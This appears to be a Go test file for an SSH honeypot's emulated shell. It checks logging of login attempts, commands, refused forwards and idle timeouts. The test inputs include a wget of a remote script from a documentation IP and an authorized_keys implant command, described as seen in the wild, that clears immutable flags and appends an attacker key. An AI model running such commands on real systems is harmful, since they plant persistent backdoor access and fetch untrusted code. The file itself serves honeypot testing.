package tcp

import (
	"io"
	"net"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/mushorg/glutton/protocols/helpers"
	"github.com/mushorg/glutton/protocols/recall"
	sshproto "github.com/mushorg/glutton/protocols/tcp/ssh"
	"github.com/spf13/viper"
	"github.com/stretchr/testify/require"
	cryptossh "golang.org/x/crypto/ssh"
)

func startShellSSH(t *testing.T, store *recall.Store, pick int) (string, *fakeHoneypot, chan error) {
	t.Helper()
	useSSHRecall(t, store, pick)
	viper.Set("ssh.shell", true)
	t.Cleanup(func() { viper.Set("ssh.shell", nil) })
	useSSHStore(t)
	return serveSSH(t)
}

// sshStoreDir is where the latest useSSHStore keeps files.
var sshStoreDir string

// useSSHStore keeps the files the shell writes in a temporary directory.
func useSSHStore(t *testing.T) string {
	t.Helper()
	dir := t.TempDir()
	sshStoreDir = dir
	old := sshStore
	sshStore = func(data []byte, _ string) (string, error) { return helpers.Store(data, dir) }
	t.Cleanup(func() { sshStore = old })
	return dir
}

// sshDial logs in with a password, retrying until the shell opens.
func sshDial(t *testing.T, addr, user, password string) *cryptossh.Client {
	t.Helper()
	cfg := &cryptossh.ClientConfig{
		User:            user,
		Auth:            []cryptossh.AuthMethod{cryptossh.RetryableAuthMethod(cryptossh.Password(password), 10)},
		HostKeyCallback: cryptossh.InsecureIgnoreHostKey(),
		Timeout:         sshTimeout,
	}
	client, err := cryptossh.Dial("tcp", addr, cfg)
	require.NoError(t, err)
	return client
}

func TestSSHShellExec(t *testing.T) {
	addr, hp, done := startShellSSH(t, recall.New(recall.DefaultConfig()), 3)
	client := sshDial(t, addr, "root", "123456")
	require.Equal(t, "SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u3", string(client.ServerVersion()))
	sess, err := client.NewSession()
	require.NoError(t, err)
	out, err := sess.CombinedOutput("uname -s; cat /etc/os-release | head -1; wget http://198.51.100.9/x.sh")
	var exit *cryptossh.ExitError
	require.ErrorAs(t, err, &exit, "wget fails like a host without network")
	require.Equal(t, 4, exit.ExitStatus())
	require.Contains(t, string(out), "Linux\n")
	require.Contains(t, string(out), "Debian GNU/Linux 12 (bookworm)")
	require.Contains(t, string(out), "wget: unable to resolve host address")
	client.Close()

	_, frames := waitSSHEvent(t, hp, done)
	require.Equal(t, "debian-12", frames[0].Variant)
	require.Equal(t, 1, frames[0].Visit)
	auth := sshFramesByCommand(frames, "read", "auth-password")
	require.Len(t, auth, 4, "three rejected guesses, then the login")
	require.Equal(t, "success", sshFramesByCommand(frames, "write", "auth-password")[3].Status)
	execs := sshFramesByCommand(frames, "read", "exec")
	require.Len(t, execs, 1)
	require.Equal(t, "uname -s; cat /etc/os-release | head -1; wget http://198.51.100.9/x.sh", string(execs[0].Payload))
	writes := sshFramesByCommand(frames, "write", "cmd")
	require.Len(t, writes, 1)
	require.Equal(t, "ok", writes[0].Status)
}

func TestSSHShellInteractive(t *testing.T) {
	addr, hp, done := startShellSSH(t, recall.New(recall.DefaultConfig()), 0)
	client := sshDial(t, addr, "admin", "admin")
	sess, err := client.NewSession()
	require.NoError(t, err)
	require.NoError(t, sess.RequestPty("xterm", 24, 80, cryptossh.TerminalModes{}))
	stdin, err := sess.StdinPipe()
	require.NoError(t, err)
	stdout, err := sess.StdoutPipe()
	require.NoError(t, err)
	require.NoError(t, sess.Shell())

	_, err = io.WriteString(stdin, "whoami\rnope\rexit\r")
	require.NoError(t, err)
	out, err := io.ReadAll(stdout)
	require.NoError(t, err)
	require.Contains(t, string(out), "admin@ubuntu:~$ ")
	require.Contains(t, string(out), "admin\r\n")
	require.Contains(t, string(out), "bash: nope: command not found\r\n")
	client.Close()

	_, frames := waitSSHEvent(t, hp, done)
	require.Len(t, sshFramesByCommand(frames, "read", "pty-req"), 1)
	require.Len(t, sshFramesByCommand(frames, "read", "shell"), 1)
	var lines []string
	for _, f := range sshFramesByCommand(frames, "read", "cmd") {
		lines = append(lines, string(f.Payload))
	}
	require.Equal(t, []string{"whoami", "nope", "exit"}, lines)
	var statuses []string
	for _, f := range sshFramesByCommand(frames, "write", "cmd") {
		statuses = append(statuses, f.Status)
	}
	require.Equal(t, []string{"ok", "not-found", "ok"}, statuses)
}

// A bot that tries one password per connection still gets in: the attempts
// count across connections within a recall visit, and the persona stays.
func TestSSHRecallPersonaAndAttempts(t *testing.T) {
	store := recall.New(recall.DefaultConfig())
	useSSHRecall(t, store, 4)
	viper.Set("ssh.shell", true)
	t.Cleanup(func() { viper.Set("ssh.shell", nil) })

	for i := 0; i < 4; i++ {
		addr, hp, done := serveSSH(t)
		cfg := &cryptossh.ClientConfig{
			User:            "root",
			Auth:            []cryptossh.AuthMethod{cryptossh.Password("hunter2")},
			HostKeyCallback: cryptossh.InsecureIgnoreHostKey(),
			Timeout:         sshTimeout,
		}
		client, err := cryptossh.Dial("tcp", addr, cfg)
		if i < 3 {
			require.Error(t, err, "connection %d", i)
		} else {
			require.NoError(t, err)
			require.Equal(t, "SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3", string(client.ServerVersion()))
			client.Close()
		}
		_, frames := waitSSHEvent(t, hp, done)
		require.Equal(t, "debian-11", frames[0].Variant, "connection %d", i)
		// the picker would now say 1, but recall remembers the first pick
		sshPick = func(int) int { return 1 }
	}
}

func TestSSHPersonaOverride(t *testing.T) {
	viper.Set("ssh.persona", "debian-11")
	t.Cleanup(func() { viper.Set("ssh.persona", nil) })
	addr, hp, done := startSSH(t)
	conn, err := net.Dial("tcp", addr)
	require.NoError(t, err)
	buf := make([]byte, 64)
	n, err := conn.Read(buf)
	require.NoError(t, err)
	require.True(t, strings.HasPrefix(string(buf[:n]), "SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3\r\n"))
	conn.Close()
	_, frames := waitSSHEvent(t, hp, done)
	require.Equal(t, "debian-11", frames[0].Variant)
}

func TestSSHPersonasValid(t *testing.T) {
	seen := map[string]bool{}
	for _, p := range sshproto.Personas {
		require.False(t, seen[p.Name], p.Name)
		seen[p.Name] = true
		require.True(t, strings.HasPrefix(p.Version, "SSH-2.0-OpenSSH_"), p.Name)
		require.NotContains(t, strings.ToLower(p.Hostname+p.Version), "glutton")
	}
	require.Equal(t, sshproto.ServerVersion, sshproto.Personas[0].Version)
}

// the command line of the authorized_keys implant seen in the wild
const sshImplant = `uname -a && nproc && sh -c 'cd ~ && \
mkdir -p .ssh && \
chattr -i .ssh 2>/dev/null || true && \
cd .ssh && \
chattr -i authorized_keys 2>/dev/null || true && \
echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAk33BTdNE $(whoami)@$(hostname)" >> authorized_keys && \
chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys'`

// The implant runs to the end, its key is recorded and stored, and a second
// session of the same connection sees the file. The connection then closes by
// itself once nothing runs for the idle timeout.
func TestSSHShellImplantAndIdleClose(t *testing.T) {
	viper.Set("ssh.idle_timeout", 200*time.Millisecond)
	t.Cleanup(func() { viper.Set("ssh.idle_timeout", nil) })
	addr, hp, done := startShellSSH(t, recall.New(recall.DefaultConfig()), 3)
	dir := sshStoreDir
	client := sshDial(t, addr, "kafei", "kafei123456")

	sess, err := client.NewSession()
	require.NoError(t, err)
	out, err := sess.CombinedOutput(sshImplant)
	require.NoError(t, err, string(out))
	require.Contains(t, string(out), "Linux debian ")

	sess, err = client.NewSession()
	require.NoError(t, err)
	out, err = sess.CombinedOutput("cat ~/.ssh/authorized_keys; ls -la ~/.ssh")
	require.NoError(t, err)
	require.Contains(t, string(out), "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAk33BTdNE kafei@debian\n")
	require.Contains(t, string(out), "-rw------- 1 kafei kafei")

	// the client stays connected; the idle timeout ends the visit
	ev, frames := waitSSHEventTimed(t, hp, done)
	require.Equal(t, "handler_close", ev.endReason)
	writes := sshFramesByCommand(frames, "read", "write-file")
	require.Len(t, writes, 1)
	require.Equal(t, "/home/kafei/.ssh/authorized_keys", writes[0].Path)
	require.Equal(t, "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAk33BTdNE kafei@debian\n", string(writes[0].Payload))
	require.Equal(t, helpers.SHA256Hex(writes[0].Payload), writes[0].PayloadHash)
	stored, err := os.ReadFile(filepath.Join(dir, writes[0].PayloadHash))
	require.NoError(t, err)
	require.Equal(t, writes[0].Payload, stored)
	require.Equal(t, sshproto.FleetAuthKeysImplant, ev.fleet)
	// frames carry their offset from the connection start, in order
	var last int64
	for _, f := range frames {
		require.GreaterOrEqual(t, f.OffsetMs, last, "%s %s", f.Direction, f.Command)
		last = f.OffsetMs
	}
	require.Positive(t, last)
	require.Len(t, sshFramesByCommand(frames, "read", "exec"), 2)
	for _, f := range sshFramesByCommand(frames, "write", "cmd") {
		require.Equal(t, "ok", f.Status)
	}
	client.Close()
}

// Port forwards and global requests are recorded with their target and refused.
func TestSSHRecordsRefusedChannelsAndRequests(t *testing.T) {
	viper.Set("ssh.idle_timeout", 200*time.Millisecond)
	t.Cleanup(func() { viper.Set("ssh.idle_timeout", nil) })
	addr, hp, done := startShellSSH(t, recall.New(recall.DefaultConfig()), 0)
	client := sshDial(t, addr, "root", "root")

	_, err := client.Dial("tcp", "203.0.113.7:6379")
	require.Error(t, err, "the forward is refused")
	ok, _, err := client.SendRequest("tcpip-forward", true, cryptossh.Marshal(struct {
		Addr string
		Port uint32
	}{"0.0.0.0", 2222}))
	require.NoError(t, err)
	require.False(t, ok)
	sess, err := client.NewSession()
	require.NoError(t, err)
	require.Error(t, sess.RequestSubsystem("sftp"))

	_, frames := waitSSHEvent(t, hp, done)
	chans := sshFramesByCommand(frames, "read", "channel-open")
	require.Len(t, chans, 1)
	require.Equal(t, "direct-tcpip", chans[0].Type)
	require.Equal(t, "203.0.113.7:6379", chans[0].Target)
	globals := sshFramesByCommand(frames, "read", "global-request")
	require.Len(t, globals, 1)
	require.Equal(t, "tcpip-forward", globals[0].Type)
	require.Equal(t, "0.0.0.0:2222", globals[0].Target)
	reqs := sshFramesByCommand(frames, "read", "channel-request")
	require.Len(t, reqs, 1)
	require.Equal(t, "subsystem", reqs[0].Type)
	client.Close()
}

// A client that logs in and never opens a session no longer holds the
// connection for the full connection timeout.
func TestSSHIdleBeforeSession(t *testing.T) {
	viper.Set("ssh.idle_timeout", 100*time.Millisecond)
	t.Cleanup(func() { viper.Set("ssh.idle_timeout", nil) })
	addr, hp, done := startShellSSH(t, recall.New(recall.DefaultConfig()), 0)
	client := sshDial(t, addr, "root", "root")
	start := time.Now()
	_, frames := waitSSHEvent(t, hp, done)
	require.Less(t, time.Since(start), 5*time.Second)
	require.Equal(t, "success", sshFramesByCommand(frames, "write", "auth-password")[3].Status)
	client.Close()
}
